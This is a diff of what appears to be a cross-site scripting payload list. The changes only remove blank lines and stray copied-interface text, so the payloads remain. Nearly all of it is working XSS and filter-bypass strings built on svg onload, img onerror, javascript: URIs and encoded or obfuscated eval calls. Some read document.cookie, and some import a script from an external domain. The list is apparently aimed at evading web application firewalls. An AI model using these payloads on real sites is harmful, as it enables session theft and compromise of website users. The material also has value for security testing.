@@ -2,7 +2,6 @@
 
 "><img/src/onerror=import('//domain/')>"@yourdomain
 013371337;ext=<img/src/onerror=import('//domain/')>
-
 <Svg Only=1 OnLoad=confirm(document.domain)>
 <Svg/OnLoad=alert(1337)>"@gmail.com
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
@@ -22,16 +21,12 @@ javascript:var a="ale";var b="rt";var c="()";decodeURI("<button popovertarget=x>
 <a/href="javascript:Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">ClickMe
 <Script>window.valueOf=alert;window%2B1</Script>
 <svg/onload=location=location.hash.substr(1)>#javascript:alert(1)
-
-
 "><form onformdata%3Dwindow.confirm(cookie)><button>XSS here<!--
 1%22onfocus=%27alert%28document.cookie%29%27%20autofocus=
 1%22onfocus=%27window.alert%28document.cookie%29%27%20autofocus=
 "><𝘀𝘃𝗴+𝗼𝗻𝗹𝗼𝗮𝗱=𝗰𝗼𝗻𝗳𝗶𝗿𝗺(𝗰𝗼𝗼𝗸𝗶𝗲)> 
 - 1'"();<test><ScRiPt >window.alert("XSS_WAF_BYPASS")
 '"><img src=x onerror=alert("xss!")>.pdf
-
-
 "><input%252bTyPE%25253d"hxlxmj"%252bSTyLe%25253d"display%25253anone%25253b"%252bonfocus%25253d"this.style.display%25253d'block'%25253b%252bthis.onfocus%25253dnull%25253b"%252boNMoUseOVer%25253d"this['onmo'%25252b'useover']%25253dnull%25253beval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))%25253b"%252bAuToFOcus>
 %3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
 <sVG/oNLY%3d1/**/On+ONloaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>
@@ -51,10 +46,7 @@ b=String.fromCharCode.apply(null,a);var c=[88,115,112,108,111,105,116];var d=Str
 <svg onload="alert(1)"></svg>
 jaVasCript:/*-/*`/*\`/*'/*&quot;/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/(/*%252f%252a*/*&#x252f;&#x252a;prompt(1)&#x252f;&#x253b;/**/;eval(atob('YWxlcnQoIkhpISIp'))//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%0d%0a//%0D%0A%252f%252a*/)//
 <select><noembed></select><script x='a@b'a> y='a@b'//a@b%0a\u0061lert('CYBERTIX')</script x>
-
-
 <EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
-
 <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
 "'`><\x3Cimg src=xxx:x onerror=javascript:alert(1)>
 <math><x xlink:href=javascript:confirm`1`>click
@@ -79,13 +71,10 @@ javascript:%ef%bb%bfalert(XSS)
 "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 "\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
 &#34;&gt;&lt;track/onerror=&#x27;confirm\%601\%60&#x27;&gt;
-
 <svg/onload=location=‘javas’%2B‘cript:’%2B
 ‘ale’%2B‘rt’%2Blocation.hash.substr(1)>#(1)
-
 <svg/onload=location=/javas/.source%2B/cript:/.source%2B
 /ale/.source%2B/rt/.source%2Blocation.hash.substr(1)>#(1)
-
 "'`//><Svg+Only%3d1+OnLoad%3dconfirm(atob("WW91IGhhdmUgYmVlbiBoYWNrZWQgYnkgb3R0ZXJseSE"))>
 "%2Bself[%2F*foo*%2F'alert'%2F*bar*%2F](self[%2F*foo*%2F'document'%2F*bar*%2F]['domain'])%2F%2F
 <SCRIPT>location=%27javasCript:alert\x281\x29%27</SCRIPT>
@@ -106,10 +95,6 @@ login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520docume
 ### Payloads para Cerrar las Comillas y Ejecutar `alert`
 
 #### 1. **Cerrar las Comillas con `"` y Escapar con `\`**
-
-html
-
-Copiar código
 
 `"\x60-setTimeout\x60alert\x601\x60\x60-\x60"`
 
